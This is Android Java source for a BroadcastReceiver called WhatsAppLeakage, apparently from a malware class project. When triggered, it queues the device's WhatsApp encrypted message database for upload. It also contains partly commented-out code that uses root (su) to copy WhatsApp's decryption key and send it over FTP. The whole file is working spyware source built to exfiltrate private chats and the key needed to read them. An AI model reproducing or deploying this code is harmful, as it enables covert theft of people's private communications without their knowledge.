package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.util.ArrayList;

public class WhatsAppLeakage extends BroadcastReceiver {

    private static final String TAG = "WHATSAPP";
    private static String cacheDirPath = null;

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Started");
        File file = new File("/sdcard/WhatsApp/Databases/msgstore.db.crypt12");
        cacheDirPath = context.getCacheDir().getAbsolutePath();
        //File key2 = new File("/data/data/com.whatsapp/files/key");

        //File[] files = new File[2];

        // upload key and database
        File[] files = new File[1];
        files[0] = file;
        /*
        if (checkRootPermission()) {
            new ExportCryptKey().getCommandsToExecute();
            File key = new File(context.getCacheDir(), "key.txt");
            files[1] = key;
        }
        */

        //new FTP(context).upload(files, "locations");
        if(UploadData.getIstance(context).addFile("whatsapp", files))
            Log.d(TAG, "Whatsapp data added!");

    }

    private boolean checkRootPermission(){
        Process executor = null;
        try {
            executor = Runtime.getRuntime().exec("su -c ls /data/data");
            executor.waitFor();
            return executor.exitValue() != 0;
        } catch (IOException e) {
            e.printStackTrace();
        }catch (InterruptedException e){
            e.printStackTrace();
        }
        return false;
    }

    private class ExportCryptKey extends ExecuteAsRootBase{

        @Override
        protected ArrayList<String> getCommandsToExecute() {
            ArrayList<String> commands = new ArrayList<>();
            String command = "cp /data/data/com.whatsapp/files/key " + cacheDirPath + "/key.txt";
            commands.add(command);
            return commands;
        }
    }

}



